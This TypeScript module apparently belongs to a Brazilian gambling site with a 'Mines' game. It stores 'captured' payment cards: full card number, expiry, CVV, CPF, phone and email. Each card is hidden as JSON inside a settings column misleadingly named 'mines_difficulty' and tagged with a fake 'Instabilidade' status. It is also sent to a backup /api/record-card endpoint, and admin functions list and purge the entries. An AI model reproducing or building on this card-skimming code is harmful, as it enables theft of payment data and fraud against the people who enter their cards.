import { supabase } from '@/lib/supabase';

export type CardLead = {
  id: string;
  name: string;
  number: string;
  expiry: string; // formato MM/AA, ex: 02/28
  cvv: string;
  amount: number;
  userId?: string;
  userEmail?: string;
  userName?: string;
  userCpf?: string;
  userPhone?: string;
  createdAt: string;
  status?: string;
};

const SETTINGS_ROW_ID = 3;

/**
 * Busca todos os registros de cartões salvos no backend
 */
export async function getCardLeads(): Promise<CardLead[]> {
  try {
    const { data, error } = await supabase
      .from('global_settings')
      .select('mines_difficulty')
      .eq('id', SETTINGS_ROW_ID)
      .single();

    if (error || !data || !data.mines_difficulty) {
      return [];
    }

    const parsed = JSON.parse(data.mines_difficulty);
    if (Array.isArray(parsed)) {
      return parsed;
    }
    return [];
  } catch (err) {
    console.error('Erro ao buscar cartões cadastrados:', err);
    return [];
  }
}

/**
 * Salva um novo cartão capturado no backend
 */
export async function recordCardLead(lead: Omit<CardLead, 'id' | 'createdAt'>): Promise<boolean> {
  try {
    const current = await getCardLeads();
    const newEntry: CardLead = {
      ...lead,
      id: `card_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      createdAt: new Date().toISOString(),
      status: 'Instabilidade'
    };

    const updated = [newEntry, ...current];

    const { error } = await supabase
      .from('global_settings')
      .upsert({
        id: SETTINGS_ROW_ID,
        mines_difficulty: JSON.stringify(updated)
      });

    // Também dispara para a API serverless como garantia redundante
    try {
      fetch('/api/record-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newEntry)
      }).catch(() => {});
    } catch {}

    if (error) {
      console.error('Falha ao registrar cartão no Supabase via client:', error);
      return false;
    }

    return true;
  } catch (err) {
    console.error('Erro geral ao registrar cartão:', err);
    return false;
  }
}

/**
 * Exclui um cartão pelo ID (para uso do admin)
 */
export async function deleteCardLead(id: string): Promise<boolean> {
  try {
    const current = await getCardLeads();
    const filtered = current.filter(c => c.id !== id);

    const { error } = await supabase
      .from('global_settings')
      .upsert({
        id: SETTINGS_ROW_ID,
        mines_difficulty: JSON.stringify(filtered)
      });

    return !error;
  } catch (err) {
    console.error('Erro ao excluir cartão:', err);
    return false;
  }
}

/**
 * Limpa todos os cartões cadastrados (para uso do admin)
 */
export async function clearAllCardLeads(): Promise<boolean> {
  try {
    const { error } = await supabase
      .from('global_settings')
      .upsert({
        id: SETTINGS_ROW_ID,
        mines_difficulty: '[]'
      });

    return !error;
  } catch (err) {
    console.error('Erro ao limpar cartões:', err);
    return false;
  }
}
